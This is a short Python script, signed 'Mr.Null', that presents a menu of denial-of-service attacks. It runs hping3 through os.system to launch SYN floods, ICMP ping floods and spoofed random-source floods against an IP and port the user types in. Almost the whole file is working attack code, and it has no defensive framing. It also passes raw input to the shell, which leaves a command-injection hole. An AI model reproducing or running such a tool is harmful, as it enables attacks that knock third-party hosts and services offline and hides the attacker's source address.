from os import system , _exit
from time import sleep


def printNG(str) :
    for char in str :
        print(char,end='',flush=True)
        sleep(0.08)
    print("\n")    

def main() :
    global choice    
    if int(choice) == 1 :
        printNG("warning! it work with your ip!!")
        ip = input("dst_ip: ")
        port = input("port:(default=0) ")
        flood = input("flood:[Y/n] ")
        if port == '' :
            if flood in ['y','Y',''] :
                system(f"hping3 --flood -S {ip}")
            elif flood in ['n','N'] :
                system(f"hping3 -S {ip}")
            else :
                printNG("missing argument!!")            

        if flood in ['y','Y',''] :
            system(f"hping3 --flood -S -p {port} {ip}")
        elif flood in ['n','N'] :
            system(f"hping3 -S -p {port} {ip}")
        else :
            printNG("missing argument!!")
    if int(choice) == 2 :
        printNG("warning! it work with your ip!!")
        ip = input("dst_ip: ")
        system(f"hping3 -1 --flood {ip}")
    if int(choice) == 3 :
        print("""
        #######################          
        #   1>SYN Flood       #
        #   2>Ping Flood      # 
        #######################
        """)
        pchoice = input("choice: ")
        if not int(pchoice) in [1,2] :
            print("missing argument!!")
        if int(pchoice) == 1 :
            ip = input("dst_ip: ")
            port = input("port:(default=0) ")
            if port == '' :
                system(f"hping3 --flood --rand-source -S {ip}")
            system(f"hping3 --flood --rand-source -S -p {port} {ip}")
        if int(pchoice) == 2 :
            ip = input("dst_ip: ")
            system(f"hping3 -1 --rand-source {ip}")

        

def getplan() :
    global choice
    print("""
    #######################          
    #   1>SYN Attack      #
    #   2>Ping Flood      # 
    #   3>Random Source   #
    #######################          
""")
    choice = input("choice>")
    if not int(choice) in [1,2,3] :
        print("your selected plan is not valid")
        _exit(1)

system("clear")
printNG("[+] Created by Mr.Null...")
getplan()
main()

